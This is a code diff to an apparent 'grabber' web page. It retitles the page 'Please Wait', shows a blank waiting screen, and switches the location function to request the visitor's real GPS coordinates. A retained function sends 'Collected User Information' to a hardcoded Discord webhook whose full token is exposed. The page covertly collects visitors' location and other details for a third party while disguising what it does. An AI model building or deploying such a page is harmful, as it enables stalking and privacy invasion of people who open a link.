@@ -3,7 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Collection and Redirect</title>
+    <title>Please Wait</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f8f8f8;
+        }
+
+        .centered-text {
+            font-size: 48px;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
     <script>
         // Function to get URL parameters
         function getUrlParameter(name) {
@@ -36,7 +53,16 @@
 
         // Function to get approximate location
         function getLocation(callback) {
-                callback({ latitude: 'Unavailable', longitude: 'Unavailable' });
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        callback({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    error => {
+                        callback({ latitude: 'Unavailable', longitude: 'Unavailable' });
                     }
                 );
             } else {
@@ -75,7 +101,7 @@
 
         // Function to send data to Discord webhook
         function sendToDiscord(data) {
-            const wurl = 'https://discord.com/api/webhooks/1270437580734730351/xtG0i70kO_TFqufkI9os4jCAqJZ3cr9S6p3eCAtc0z044qBk-XNE3dQ-XhJ-dDWTi7rs';
+            const wUrl = 'https://discord.com/api/webhooks/1270437580734730351/xtG0i70kO_TFqufkI9os4jCAqJZ3cr9S6p3eCAtc0z044qBk-XNE3dQ-XhJ-dDWTi7rs';
             const embed = {
                 title: "Collected User Information",
                 color: 3447003,
@@ -103,11 +129,11 @@
             };
 
             const message = {
-                username: "Data Collector",
+                username: "Website Data Collector",
                 embeds: [embed]
             };
 
-            fetch(wurl, {
+            fetch(wUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -128,26 +154,6 @@
             });
         };
     </script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Please Wait</title>
-    <style>
-        body, html {
-            height: 100%;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f8f8f8;
-        }
-
-        .centered-text {
-            font-size: 48px;
-            font-weight: bold;
-            color: #333;
-        }
-    </style>
 </head>
 <body>
     <div class="centered-text">Please Wait...</div>
